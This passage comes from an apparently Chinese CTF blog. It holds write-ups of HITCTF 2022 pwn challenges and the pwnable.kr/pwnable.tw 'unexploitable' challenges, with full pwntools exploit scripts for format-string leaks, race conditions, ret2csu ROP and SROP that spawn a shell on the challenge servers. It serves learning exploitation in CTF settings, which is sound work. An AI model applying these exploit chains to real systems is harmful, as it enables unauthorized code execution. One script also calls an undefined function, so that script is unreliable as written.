64 12月 13 22:32 3 -> 'socket:[328782]'\nlrwx------ 1 bling bling 64 12月 13 22:32 4 -> 'socket:[328783]'\n```\n\n3、如果再有一个客户端来连接服务端，那么在server主进程的fd目录下又会新增一个描述符。使用`lsof`可以查看进程socket详细情况。\n\n```bash\n$ ls -al /proc/891251/fd\ntotal 0\ndr-x------ 2 bling bling  0 12月 13 22:30 .\ndr-xr-xr-x 9 bling bling  0 12月 13 22:29 ..\nlrwx------ 1 bling bling 64 12月 13 22:30 0 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 1 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 2 -> /dev/pts/3\nlrwx------ 1 bling bling 64 12月 13 22:30 3 -> 'socket:[328782]'\nlrwx------ 1 bling bling 64 12月 13 22:30 4 -> 'socket:[328783]'\nlrwx------ 1 bling bling 64 12月 13 22:32 5 -> 'socket:[328923]'\n\n$ lsof -i -a -p 891251\nCOMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nserver  891251 bling    3u  IPv4 328782      0t0  TCP *:7777 (LISTEN)\nserver  891251 bling    4u  IPv4 328783      0t0  TCP localhost:7777->localhost:45958 (ESTABLISHED)\nserver  891251 bling    5u  IPv4 328923      0t0  TCP localhost:7777->localhost:55854 (ESTABLISHED)\n```\n\n下图展示了一个客户端连接和两个客户端连接的情况\n\n![image-20221214144257042](image-20221214144257042.png?size=600)\n","categories":["CTF"]},{"title":"HITCTF 2022 的两个pwn题 time 和 doc","url":"/2022/11/29/HITCTF2022/","content":"\n\n\n# HITCTF两个pwn题练习\n\n## pwn2 TIME\n\n题目附件：[pwn2.zip](pwn2.zip)\n\n### 漏洞点\n\n**1、prirntf格式化字符串 - 信息泄露**\n\nglobal_name是我们输入的字符串，通过%p可以泄露栈上的信息。\n\n![image-20221127040430586](image-20221127040430586.png?size=600)\n\n这个字符串的长度限制是0xff，所以还是可以泄露挺多东西的\n\n![image-20221127040543977](image-20221127040543977.png?size=600)\n\n\n\n**2、条件竞争race condition**\n\npthread_create起子进程执行display(v1)\n\n![image-20221127040920775](image-20221127040920775.png?size=600)\n\n重点看这个位置，a1为1表示我们输入的是想访问flag.txt，否则就是访问old_flag.txt。is_secret_file是bss段的全局变量，不同的线程根据输入的不同，会将is_secret_file的值改成0或者1\n\n![image-20221127040954125](image-20221127040954125.png?size=600)\n\na1和is_secret_file是在check_file_name()中设置的，这个函数的设置保护了flag.txt不会被直接读取到\n\n![image-20221127042437880](image-20221127042437880.png?size=600)\n\n但是is_secret_file是全局变量，所有子线程都会访问并改变该变量。考虑下面这种条件竞争时的情况\n\n![image-20221127050028893](image-20221127050028893.png?size=600)\n\n线程1本来a1为1，is_secret_file为1，file_name为\"flag.txt\"，是不满足进入dispaly_file_content()这一分支中的。但是由于有多个线程，且is_secret_file是共享变量。如果线程2此时正好运行到将is_secret_file赋值为0这里。当再次切换回到线程1时，由于is_secret_file为0，进入dispaly_file_content()这一分支。此时就会读取\"flag.txt\"继续处理。\n\n虽然直接打印出来的内容时MD4哈希过的，根据这个内容无法恢复出原本的flag内容\n\n![image-20221127050755218](image-20221127050755218.png?size=600)\n\n但是，在dispaly_file_content()函数中，可以看到会将flag.txt的内容拷贝到栈上。\n\n![image-20221127050730636](image-20221127050730636.png?size=600)\n\n于是结合第一个格式化字符串，可以将flag泄露出来。\n\n### 利用\n\n完整exp如下\n\n```python\n##!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\n# context(arch=\"i386\",os=\"linux\",log_level=\"debug\")\ncontext(arch=\"i386\",os=\"linux\",log_level=\"error\")\n\n# io = process('./time')\nio = remote(\"122.114.225.151\",10000)\n\n# gdb.attach(io, \"b *0x401147 \\n c\")\n\n# sleep(1)\n# io.recvuntil(\"Who are you?\")\n\n\n\n# io.sendlineafter(\"Who are you?\",b\"%p \"*95)      # gloabl_name\nio.sendlineafter(\"Who are you?\",b\"%p \"*80)      # gloabl_name\nio.sendlineafter(\"2.old_flag.txt\",b\"1\")         # check_file_name()\n\n# io.sendlineafter(\"2.old_flag.txt\",b\"1\")   \n# io.sendlineafter(\"2.old_flag.txt\",b\"2\")   \nio.sendline(b\"1\")\nio.sendline(b\"1\")\nio.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\nio.sendline(b\"2\")\n# io.sendline(b\"1\")\n# io.sendline(b\"1\")\n# io.sendline(b\"2\")\nsleep(1)\nio.recvuntil(\"2.old_flag.txt\")\nio.sendline(b\"1\")\nio.sendline(b\"1\")\n\nio.interactive()\n```\n\n从栈中dump出flag.txt的信息\n\n![image-20221127035038459](image-20221127035038459.png?size=600)\n\n利用脚本快速解析\n\n```python\nfrom pwn import *\n\na = [0x3032465443544948, 0x2d656d69747b3232, 0x6c69662d612d7369, 0x772d746168742d65, 0x646e612d73726165, 0x6e2d73656b616d2d, 0x7d6573696f6e2d6f, 0xa]\nresult = b\"\"\nfor i in a:\n    result += p64(i)\n    print(result)\n```\n\n得到flag\n\n![image-20221127035124249](image-20221127035124249.png?size=600)\n\n\n\n## pwn3 DOC\n\n题目附件：[pwn3.zip](pwn3.zip)\n\n### 简单解析\n\n漏洞点在这里\n\n![image-20221129164901127](image-20221129164901127.png?size=600)\n\nmax的初始值是0x800（2048 bytes），我们只需关注最后两轮的情况。当前面已转换2045 bytes的utf-8字符，而最后一个utf-16转成utf-8后是4字节时，就会覆盖到2049字节处。而2049位置处正好是flag.doc的mode，将mode改为0，在网页上通过`http://122.114.225.168:10052/doc/extract_many?files=user0.doc|flag.doc`就能查看到flag内容。\n\n[exp.doc](exp.doc)\n\n构造的doc文档内容是：`\"a\"*512 + \"b\"*512 + \"c\"*512 + \"嘀\"*167 + \"特殊字符\"*3`，这串utf-16字符转成utf-8后，正好是2049字节。\n\n以上描述中的特殊字符是指4字节的utf-8字符，从以下链接中随意找一个使用即可\n\n[UTF-8 4-BYTE CHARACTER CHART](https://design215.com/toolbox/utf8-4byte-characters.php)\n\n```\n>>> a = \"嘀\"\n>>> a.encode(\"utf-8\")\nb'\\xe5\\x98\\x80'\n>>> a.encode(\"utf-16\")\nb'\\xff\\xfe\\x00V'\n\n>>> b = \"𝄔\"\n>>> b.encode(\"utf-8\")\nb'\\xf0\\x9d\\x84\\x94'\n>>> b.encode(\"utf-16\")\n```\n\n167个\"嘀\"+3个\"𝄔\"，转换成UTF-8后，占据`167*3+3*4 = 513 `，正好覆盖到`flag.txt`的mode，将其改成非0值。\n\n### 什么是CGI\n\n[如何使用 CGI 脚本生成网页](https://linux.cn/article-9514-1.html) 这篇文章讲了静态html网页到动态html网页的发展过程，引入了CGI。\n\n[转！！常用的4种动态网页技术—CGI、ASP、JSP、PHP](https://www.cnblogs.com/wuyun-blog/p/4503818.html) 这篇文章描述了CGI的概念：客户端可以向web服务器上指定的CGI程序发起请求。web服务器收到该请求后会启动一个新的进程执行这个CGI程序，最后将程序运行的结果以网页的形式回给客户端。可以用c/c++/vb/perl等语言编写。\n\n### 字符编码\n\n[A Short History Of Character Encoding](https://thedatastudio.net/history_of_character_encoding.htm)\n\n字符编码的历史：EBDIC -> ASCII(7 bits) -> ISO/IEC 8859 family & Windows 12xx family(8 bits) -> Unicode\n\n[Unicode 和 UTF-8 有什么区别？](https://www.zhihu.com/question/23374078)\n\n[字符串在Python内部是如何省内存的](https://juejin.cn/post/6844904056062754829)\n\n[细说：Unicode, UTF-8, UTF-16, UTF-32, UCS-2, UCS-4](https://www.cnblogs.com/malecrab/p/5300503.html)\n\n[Unicode、UTF-8、UTF-16、UCS-2编码区别](https://www.iizyx.com/72/)\n\n[\"中日韩统一表意文字\"对应的unicode值](https://www.unicode.org/charts/PDF/U4E00.pdf)\n","tags":["unicode"],"categories":["CTF"]},{"title":"pwn 题练习之 unexploitable","url":"/2022/11/06/unexploitable-pwn/","content":"\n\n\n本篇wp中涉及三道pwn题，名字都叫做“unexploitable”。做完这三个题后，从保护措施及利用方法的区别，总结了如下对比图：\n\n![image-20221106180532380](image-20221106180532380.png?size=600)\n\n\n\n# pwnable.kr unexploitable\n\n题目附件：[pwnable.kr](kr-unexploitable.zip)\n\n## 分析\n\n二进制基本信息如下\n\n```bash\n$ file unexploitable\nunexploitable: setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=aba2c1fb7a4bca286d75e23006f9fe01dfcb03c2, not stripped\n\n$ checksec unexploitable\n[*] '/home/bling/Downloads/kr-unexploitable/unexploitable'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\t\t\t# got表可写\n    Stack:    No canary found\t\t# 未开启canary，栈溢出利用更方便了\n    NX:       NX enabled\t\t\t# 栈不可执行\n    PIE:      No PIE (0x400000)\t\t# 代码段未开启地址随机化\n```\n\nIDA反汇编，可以看到漏洞点超级明显，一个大大的栈溢出\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[16]; // [rsp+0h] [rbp-10h] BYREF\n\n  sleep(3u);\n  return read(0, buf, 0x50FuLL);\n}\n```\n\n## 调试\n\n通过如下脚本确定返回地址的偏移\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio =process(\"./unexploitable\")\n\ngdb.attach(io,\"b *0x400577 \\n c\")\npayload = cyclic(100)\nio.send(payload)\n\nio.interactive()\n```\n\n断点0x400577（main函数的ret）处，rsp处存放的4字节内容是`gaaa`，其偏移为24。\n\n````python\n───────────────────────────────────────────────────────────────────── stack ────\n0x007ffe16adddc8│+0x0000: \"gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]\"\t ← $rsp\n0x007ffe16adddd0│+0x0008: \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\"\n0x007ffe16adddd8│+0x0010: \"kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]\"\n0x007ffe16addde0│+0x0018: \"maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]\"\n0x007ffe16addde8│+0x0020: \"oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\"\n0x007ffe16adddf0│+0x0028: \"qaaaraaasaaataaauaaavaaawaaaxaaayaaa\"\n0x007ffe16adddf8│+0x0030: \"saaataaauaaavaaawaaaxaaayaaa\"\n0x007ffe16adde00│+0x0038: \"uaaavaaawaaaxaaayaaa\"\n─────────────────────────────────────────────────────────────── code:x86:64 ────\n     0x40056c <main+40>        mov    eax, 0x0\n     0x400571 <main+45>        call   0x400430 <read@plt>\n     0x400576 <main+50>        leave  \n●→   0x400577 <main+51>        ret    \n[!] Cannot disassemble from $PC\n\n>>> cyclic_find(\"gaaa\")\n24\n````\n\n于是通过如下脚本，我们能控制该程序执行到任意`ret_addr`地址\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nio =process(\"./unexploitable\")\n\ngdb.attach(io,\"b *0x400577 \\n c\")\nret_addr = p64(0xdeadbeef)\npayload = b\"a\"*24 + ret_addr\nio.send(payload)\n\nio.interactive()\n```\n\n\n\n## 利用\n\n\n\n### 方法1 vsyscall暴破通解\n\n由于ret时rsp指向的栈顶位置就是libc_start_main地址，因此无需使用vsyscall，直接覆盖返回地址的低3个字节为我们gadget的地址就行。\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\ns = ssh(host='pwnable.kr',user='unexploitable',password='guest',port=2222)\n\nwhile True:\n    try:\n        myio = s.run('./unexploitable')\n        payload = b\"a\"*24 + b\"\\x47\\xc2\\xc9\"   # 0xc9c247\n        sleep(3)\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n```\n\n经过漫长的等待，某一次暴破成功的场景，如果将`\"ls\"`改成`\"cat flag\"`就能直接打印flag\n\n![image-20221030232949581](image-20221030232949581.png?size=600)\n\n\n\n### 方法2 ROP\n\n题目没有给libc，预期解法应该跟libc无关。确认题目程序无后门函数，为了获得shell，我们必须劫持控制流执行`execve(\"/bin/sh\")`或`system(\"/bin/sh\")`。got表中没有这两个函数，在忽略libc的情况下，为执行`execve(\"/bin/sh\")`，还有一种方法，就是利用系统调用`syscall`指令。如下，在程序中正好找到了一条`syscall`。\n\n```bash\n$ ROPgadget --binary=\"./unexploitable\" | grep \"sys\"\n0x0000000000400560 : syscall\n```\n\n利用思路如下：\n\n1. `read(0,bss_addr1,size)`：将`\"/bin/sh\\x00\"`字符串写入bss段\n2. `read(0,bss_addr2,size)`：将`p64(0x400560)`写入bss段，ret2csu方法中通过`call [bss_addr2]`来执行syscall指令 （1 2可合并成一步）\n3. `read(0,bss_addr3,59)`：由于程序中无控制rax的gadget，所以利用该函数返回将RAX置为59，对应与`execve`的系统调用号\n4. `execve(bss_addr1,0,0)`：设置好参数后（`rax:59, rdi:\"/bin/sh\", rsi:0, rdx:0`），跳转到`syscall`指令，完成利用\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc-2.23.so\")\nmyld = ELF(\"./ld-2.23.so\")\n\ncsu_first_addr = 0x4005e6\ncsu_second_addr = 0x4005d0\ndef csu(rbx, rbp, r12, r13, r14, r15, next_func):\n    payload = b'a'*24\n    payload += p64(csu_first_addr) + p64(0x0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_second_addr)\n    payload += b'b' * 0x38\n    payload += p64(next_func)\n    return payload\n\ndef csu_pad(rbx, rbp, r12, r13, r14, r15, next_func):\n    payload = b'a'*24\n    payload += p64(csu_first_addr) + p64(0x0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601030) + p64(0x601028) + p64(0x0) + p64(0x0)\n    payload += p64(next_func)\n    return payload\n\n# myio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\ns = ssh(host='pwnable.kr',user='unexploitable',password='guest',port=2222)\nmyio = s.run('./unexploitable')\n\n# gdb.attach(myio,\"b *0x400577 \\n c\")\t # main's ret\n# gdb.attach(myio,\"b *0x4005DD \\n c\")    # csu_init after call[r12]\n# step1&step2，将\"/bin/sh\"写入0x601028地址处，将p64(0x400560)即syscall指令地址写入0x601030\n# read(0,0x601028,30) ,read@got:0x601000, main:0x400544\npayload = csu(0,1,0x601000,0,0x601028,30,0x400544)\nmyio.send(payload)\nsleep(3)\nmyio.sendline(b\"/bin/sh\\x00\"+p64(0x400560))\n\nsleep(3)\n# step3&step4，先利用read()将rax置为59，紧接着继续返回csu_init中调用syscall\n# read(0,0x601040,59) , syscall: 0x400560\npayload = csu_pad(0,1,0x601000,0,0x601050,59,0x4005d0)\nmyio.send(payload)\nsleep(3)\nmyio.sendline(b\"e\"*58)\t\t# 自动加\"\\n\"，长度最终为59\n\nmyio.interactive()\n```\n\n\n\n### 方法3 SROP\n\n> 我的利用方式是`ret2csu+sigreturn`，实际上有更简单的方法就是`栈迁移+sigreturn`\n\nSROP时如果无需再次返回执行，只需要找`syscall`单条指令就行。如果需要返回执行，需要设置好rsp，并且找`syscall; ret`合二为一的gadget。\n\n本题思路如下：\n\n1、往bss段写入\"/bin/sh\\x00\"字符串\n\n2、在栈上构造好sigFrame结构体\n\n3、利用read()将rax变成15\n\n4、pop ip，执行sigreturn\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./remote-lib/libc-2.23.so\")\nmyld = ELF(\"./remote-lib/ld-2.23.so\")\n\ncsu_first_addr = 0x4005e6\ncsu_second_addr = 0x4005d0\nsyscall_addr = 0x400560\nsyscall_ret_addr = 0xffffffffff600007\nread_got_addr =  0x601000\nbss_bin_sh_addr = 0x601028\nmain_addr = 0x400544\n\ndef csu(rbx, rbp, r12, r13, r14, r15, next_func):\n    payload = b'a'*24\n    payload += p64(csu_first_addr) + p64(0x0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)         # read(0,bss_bin_sh_addr,30) <<- \"/bin/sh\\x00\"\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(read_got_addr) + p64(0x0) + p64(0x601050) + p64(0xf)                # read(0,bss_bin_sh_addr+0x28,15) <<-- arbitrary data, set rax be 15\n    payload += p64(next_func)\n    return payload\n\n# myio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\ns = ssh(host='pwnable.kr',user='unexploitable',password='guest',port=2222)\nmyio = s.run('./unexploitable')\n\n# gdb.attach(myio,\"b *0x400577 \\n c\")\n# gdb.attach(myio,\"b *0x4005DD \\n c\")    # 0x4005DD\n# payload = b\"a\"*24 + p64(0x400544) + b\"b\"*8 +b\"c\"*8\n# read(0,bss_bin_sh_addr,30) <<- \"/bin/sh\\x00\"\npayload = csu(0,1,read_got_addr,0,bss_bin_sh_addr,30,csu_second_addr)\npayload += p64(0x0)*7                                         # padding\npayload += p64(syscall_addr)                                  # sigreturn\n\nframe = SigreturnFrame(kernel=\"amd64\")\nframe.rax = 59\nframe.rdi = bss_bin_sh_addr\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = syscall_addr\npayload += bytes(frame)\n\nmyio.send(payload)\nsleep(3)\n# read(0,bss_bin_sh_addr,30)\nmyio.sendline(b\"/bin/sh\\x00\")\nsleep(3)\n# read(0,bss_bin_sh_addr+0x28,15) \nmyio.sendline(b\"a\"*14)\nmyio.interactive()\n```\n\n### 其他方法参考\n\n[[pwnable.kr] unexploitable](https://blog.gye0ngje.com/377) ：栈迁移+sigreturn，此方法未使用通用gadget`libc_csu_init`，更简单\n\n[Pwnable Challenge: Unexploitable](http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-unexploitable/) ：如果目标服务器/tmp目录可写，local exp\n\n\n\n\n\n## 知识点\n\n### SROP\n\n[CTFwiki-SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)\n\n[Sigreturn Oriented Programming攻击简介](https://www.anquanke.com/post/id/85810)\n\n[Sigreturn-Oriented Programming (SROP)](https://amriunix.com/post/sigreturn-oriented-programming-srop/)\n\n- 正常情况下的linux signal机制流程\n\n  ![image-20221105143156572](image-20221105143156572.png?size=600)\n\n  ![image-20221106144212266](image-20221106144212266.png?size=600)\n\n  1、用户态某个进程发起signal，控制权转移到内核\n\n  2、内核保存用户态进程的上下文信息（寄存器状态等），并把rt_sigreturn地址压栈。然后跳转到用户态执行signal handler\n\n  3、signal handler执行完后，调用rt_sigreturn进入内核态\n\n  4、内核恢复`步骤2`中保存的用户态进程上下文信息，后将控制权交给用户态进程\n\n\n\n- SROP利用的是后半部分\n\n  > 第二步保存的上下文信息在用户栈中，用户态有权限改写\n\n  在栈中布置好sigFrame结构体，执行sigreturn。再次从内核返回时，会弹出栈中sigFrame结构到各个寄存器，于是实现用户态控制流劫持。\n\n  ```python\n  # pwntools中已集成SROP攻击的函数\n  sigframe = SigreturnFrame()\n  sigframe.rax = xxx\n  sigframe.rdi = xxx\n  sigframe.rsi = xxx\n  sigframe.rdx = xxx\n  sigframe.rsp = xxx\n  sigframe.rip = xxx\n  ```\n\n  \n\n### ret2setcontext53\n\n[setcontext学习](https://psyduck0409.github.io/2021/04/25/2021/setcontext%E5%AD%A6%E4%B9%A0/)\n\n[setcontext 函数](https://n0va-scy.github.io/2022/02/14/setcontext/)\n\n堆题中常用的一个方法，设置的结构体跟SROP中构造的结构体是同一个。\n\n该方法本题未使用，因为碰巧看到了，就暂时记在这里。\n\n\n\n# pwnable.tw unexploitable\n\n[pwnable.tw](tw-unexploitable.zip)\n\n>  在pwnable.kr的基础上，去掉了程序中的`syscall`指令\n\n## 分析\n\n题目给了一个二进制程序`unexploitable`和libc文件`libc_64.so.6`。先看一下基本信息：\n\n- 64位动态链接程序，未去符号表；\n- got表可写，栈未开canary，栈不可执行，未开代码段随机化\n- libc版本是2.23\n\n```bash\n$ file unexploitable \nunexploitable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=aba2c1fb7a4bca286d75e23006f9fe01dfcb03c2, not stripped\n\n$ checksec unexploitable \n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)\n[*] '/home/bling/Downloads/tw-unexploitable/unexploitable'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n\n$ strings libc_64.so.6| grep version\nversionsort64\nversionsort\nargp_program_version_hook\ngnu_get_libc_version\nargp_program_version\nRPC: Incompatible versions of RPC\nRPC: Program/version mismatch\n<malloc version=\"1\">\nPrint program version\n(PROGRAM ERROR) No version known!?\n%s: %s; low version = %lu, high version = %lu\nGNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.\nCompiled by GNU CC version 5.4.0 20160609.\n\tcrypt add-on version 2.1 by Michael Glad and others\n.gnu.version\n.gnu.version_d\n.gnu.version_r\n\n```\n\n运行该程序，输入超长字符串后，程序崩溃\n\n```bash\n$ ./unexploitable \n111111111111111111111111111111111111111111111111111111111111111111111\n[1]    32752 segmentation fault (core dumped)  ./unexploitable\n```\n\nIDA中查看程序主要逻辑，很明显的一个栈溢出\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[16]; // [rsp+0h] [rbp-10h] BYREF\n\n  sleep(3u);\n  return read(0, buf, 0x100uLL);\n}\n```\n\n## 调试\n\n使用如下脚本发送100个字符给程序，观察main函数ret时栈顶的情况\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc_64.so.6\")\nmyio = process(myelf.path)\n\ngdb.attach(myio)\n\nsleep(3)\npayload = cyclic(100)\nmyio.send(payload)\n\nmyio.interactive()\n```\n\n单步到ret指令处，此时栈顶的四字节为gaaa\n\n```\n──────────────────────────────────── stack ────\n0x007ffd2806b8d8│+0x0000: \"gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]\"\t ← $rsp\n0x007ffd2806b8e0│+0x0008: \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\"\n─────────────────────────────── code:x86:64 ────\n     0x40056c <main+40>        mov    eax, 0x0\n     0x400571 <main+45>        call   0x400430 <read@plt>\n     0x400576 <main+50>        leave  \n →   0x400577 <main+51>        ret    \n[!] Cannot disassemble from $PC\n```\n\n所以返回地址的偏移为24\n\n```python\n>>> from pwn import *\n>>> cyclic_find(\"gaaa\")\n24\n```\n\n通过溢出main函数的返回地址，我们可以将控制流劫持到任意地址，如`0xdeadbeef`\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc_64.so.6\")\n\nmyio = process(myelf.path)\n\nsleep(3)\npayload = b\"a\"*24 + p64(0xdeadbeef)\nmyio.send(payload)\n\nmyio.interactive()\n```\n\n\n\n## 利用\n\n通过栈溢出，我们可以控制程序执行到任意地址，下一步该怎样呢？\n\n```bash\n$ strings unexploitable| grep system\n\n$ strings unexploitable| grep \"/bin/sh\"\n\n$ ROPgadget --binary=\"./unexploitable\" > rop.txt\n \n$ cat rop.txt| grep pop\n0x000000000040050b : add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x000000000040050e : add esp, 8 ; pop rbx ; pop rbp ; ret\n0x000000000040050d : add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x000000000040064e : int1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x0000000000400536 : je 0x400540 ; pop rbp ; mov edi, 0x600e48 ; jmp rax\n0x000000000040064d : jne 0x400640 ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x0000000000400538 : pop rbp ; mov edi, 0x600e48 ; jmp rax\n0x0000000000400512 : pop rbp ; ret\n0x0000000000400511 : pop rbx ; pop rbp ; ret\n0x000000000040064c : push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n\n$ cat rop.txt| grep syscall\n\n$ objdump -R ./unexploitable\n\n./unexploitable:     file format elf64-x86-64\n\nDYNAMIC RELOCATION RECORDS\nOFFSET           TYPE              VALUE \n0000000000600fe0 R_X86_64_GLOB_DAT  __gmon_start__\n0000000000601000 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5\n0000000000601008 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5\n0000000000601010 R_X86_64_JUMP_SLOT  sleep@GLIBC_2.2.5\n```\n\n可以看到，没有合适的gadget，程序中没有syscall指令，got表中没有puts/write/printf的信息泄露函数。那我们现在有什么呢？\n\n- 通用gadget段（libc_csu_init）可用\n- vsyscall（0xffffffffff600000）区域存在，可以当作一个ret\n- read/system函数在libc中偏移一定位置有syscall指令\n\n所以，总的思路还是要么暴破，要么通过ROP(syscall)或者SROP\n\n### 方法1 vsyscall暴破通解 \n\n> 本地打成功了，远程未成功\n\n检查溢出字节，查看`ret`时栈中情况\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc_64.so.6\")\n\nmyio = process(myelf.path)\n\nsleep(3)\npayload = b\"a\"*24 + b\"b\"\nmyio.send(payload)\n\nmyio.interactive()\n```\n\n如下，`ret`时，rsp中的值正好为libc中地址，因此我们可以找一条合适的onegadget，进行暴破。\n\n![image-20221031141752231](image-20221031141752231.png?size=600)\n\n根据栈中的状态及onegadget的限制条件，确定libc中偏移为`0xf0567`的gadget可用\n\n![image-20221031142446714](image-20221031142446714.png?size=600)\n\n本地的脚本代码如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    try:\n        myio = process(\"./unexploitable\")\n        payload = b\"a\"*24 + b\"\\xfc\\xc2\\xba\"  # one_gadget: 0x10a2fc\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n```\n\n远程代码如下，但是未成功，跑到800多次的时候远程服务器无响应了\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\na = 0\t\t\t# 用于计数\nwhile True:\n    try:\n        myio = remote(\"chall.pwnable.tw\",10403)\n        sleep(3)\n        payload = b\"a\"*24 + b\"\\x67\\x05\\x9a\"  # 0xf0567,0xef6c4,0x4526a\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        a += 1\n        print(\"[+++] {:d}\".format(a))\n        myio.close()\n\n```\n\n### 方法2 ROP\n\n> 利用ret2csu+read函数可以实现任意地址写任意值\n\nROP的思路如下：\n\n1. 改sleep的got表项内容，低1字节改成`\"\\xDE\"`。sleep在libc中的偏移为`0xCB680`，在`0xCB6DE`处是一条syscall指令。\n2. 将“/bin/sh\\x00”写到bss段，写入总长度位59，返回后rax被置为59\n3. 布置好rdi，rsi，rdx三个参数的值，通过syscall完成`execve(\"/bin/sh\",0,0)`的调用，获得shell\n\n完整利用代码如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\ncsu_first_addr = 0x4005e6\ncsu_second_addr = 0x4005d0\n\ndef csu_chain(rbx, rbp):\n    payload = b'a'*24 + p64(csu_first_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601000) + p64(0) + p64(0x601010) + p64(1)     # read(0,0x601010,1)\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601000) + p64(0) + p64(0x601030) + p64(59)     # read(0,0x601040,59)\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601010) + p64(0x601030) + p64(0) + p64(0)     # execve(0x601030,0,0)\n    payload += p64(csu_second_addr)\n    return payload\n\nmyio = remote(\"chall.pwnable.tw\",10403)\n\n# myio = process(\"./unexploitable\")\n# gdb.attach(myio,\"b *0x4005d6 \\n c\")\n\npayload = csu2(0,1)\nsleep(3)\nmyio.send(payload)\nsleep(0.03)\n# myio.send(b\"\\xa2\")      # local:\\xa2 , ubuntu1804\nmyio.send(b\"\\xde\")        # remote: \\xde\nsleep(0.03)\nmyio.send(b\"/bin/sh\\x00\"+b\"a\"*51)\n\nmyio.interactive()\n```\n\n### 方法3 SROP\n\n> 